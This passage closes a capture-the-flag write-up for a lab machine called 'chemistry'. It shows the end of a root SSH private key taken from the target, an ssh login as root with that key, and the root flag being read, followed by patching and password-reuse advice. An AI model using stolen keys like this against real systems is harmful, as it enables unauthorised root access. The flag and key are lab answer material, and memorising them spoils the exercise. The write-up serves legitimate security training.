+</span></span><span style=display:flex><span>syGiF0HQDvl+gYVCHwOkTEjvGV2pSkhFEjgQXizB9EXXWsG1xZ3QzVq95HmKXSJoiw2b+E
+</span></span><span style=display:flex><span>9F6ERvw84P6Opf5X5fky87eMcOpzrRgLXeCCz0geeqSa/tZU0xyM1JM/eGjP4DNbGTpGv4
+</span></span><span style=display:flex><span>PT9QDq+ykeDuqLZkFhgMped056cNwOdNmpkWRIck9ybJMvEA8AAADBAOlEI0l2rKDuUXMt
+</span></span><span style=display:flex><span>XW1S6DnV8OFwMHlf6kcjVFQXmwpFeLTtp0OtbIeo7h7axzzcRC1X/J/N+j7p0JTN6FjpI6
+</span></span><span style=display:flex><span>yFFpg+LxkZv2FkqKBH0ntky8F/UprfY2B9rxYGfbblS7yU6xoFC2VjUH8ZcP5+blXcBOhF
+</span></span><span style=display:flex><span>hiv6BSogWZ7QNAyD7OhWhOcPNBfk3YFvbg6hawQH2c0pBTWtIWTTUBtOpdta0hU4SZ6uvj
+</span></span><span style=display:flex><span>71odqvPNiX+2Hc/k/aqTR8xRMHhwPxxwAAAMEAwYZp7+2BqjA21NrrTXvGCq8N8ZZsbc3Z
+</span></span><span style=display:flex><span>2vrhTfqruw6TjUvC/t6FEs3H6Zw4npl+It13kfc6WkGVhsTaAJj/lZSLtN42PXBXwzThjH
+</span></span><span style=display:flex><span>giZfQtMfGAqJkPIUbp2QKKY/y6MENIk5pwo2KfJYI/pH0zM9l94eRYyqGHdbWj4GPD8NRK
+</span></span><span style=display:flex><span>OlOfMO4xkLwj4rPIcqbGzi0Ant/O+V7NRN/mtx7xDL7oBwhpRDE1Bn4ILcsneX5YH/XoBh
+</span></span><span style=display:flex><span>1arrDbm+uzE+QNAAAADnJvb3RAY2hlbWlzdHJ5AQIDBA<span style=color:#f92672>==</span>
+</span></span><span style=display:flex><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>Now we can copy that to our attacker machine, and then ssh in as root.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ ssh -i rootkey root@chemistry
+</span></span><span style=display:flex><span>Welcome to Ubuntu 20.04.6 LTS <span style=color:#f92672>(</span>GNU/Linux 5.4.0-196-generic x86_64<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
+</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/pro
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> System information as of Mon <span style=color:#ae81ff>07</span> Jul <span style=color:#ae81ff>2025</span> 04:37:11 PM UTC
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  System load:           0.0
+</span></span><span style=display:flex><span>  Usage of /:            76.2% of 5.08GB
+</span></span><span style=display:flex><span>  Memory usage:          23%
+</span></span><span style=display:flex><span>  Swap usage:            0%
+</span></span><span style=display:flex><span>  Processes:             <span style=color:#ae81ff>235</span>
+</span></span><span style=display:flex><span>  Users logged in:       <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>  IPv4 address <span style=color:#66d9ef>for</span> eth0: 10.129.231.170
+</span></span><span style=display:flex><span>  IPv6 address <span style=color:#66d9ef>for</span> eth0: dead:beef::250:56ff:feb0:966d
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Expanded Security Maintenance <span style=color:#66d9ef>for</span> Applications is not enabled.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span> updates can be applied immediately.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>9</span> additional security updates can be applied with ESM Apps.
+</span></span><span style=display:flex><span>Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>The list of available updates is more than a week old.
+</span></span><span style=display:flex><span>To check <span style=color:#66d9ef>for</span> new updates run: sudo apt update
+</span></span><span style=display:flex><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Last login: Fri Oct <span style=color:#ae81ff>11</span> 14:06:59 <span style=color:#ae81ff>2024</span>
+</span></span><span style=display:flex><span>root@chemistry:~# cd /root
+</span></span><span style=display:flex><span>root@chemistry:~# cat root.txt
+</span></span><span style=display:flex><span>26420c722c15ca06b9xxxxxxxxxxxxxx
+</span></span></code></pre></div><h3 id=closing-the-vulnerability>Closing the Vulnerability</h3><ul><li>Patch vulnerable software versions. Both websites were exploitable simply because of a lack of patching.</li><li>Use good passwords.</li><li>Don&rsquo;t reuse passwords. Even if we had been able to crack Rosa&rsquo;s web password, we still wouldn&rsquo;t have been able to escalate without her reusing her password. Note that I tried reaching localhost:8080 from the shell as the app user that we had, and it refused the connection, leading me to believe that the box creator even set it up so that only Rosa or root could access it.</li></ul><h3 id=key-penetration-testing-takeaways>Key Penetration Testing Takeaways</h3><ul><li>Vulnerable versions are the first thing you should check for.</li><li>Any time you get a password, check everywhere for reuse.</li><li>Take the time to actually understand exploit PoCs.</li></ul></div></article></div><script src=/lightbox.js></script></body></html>
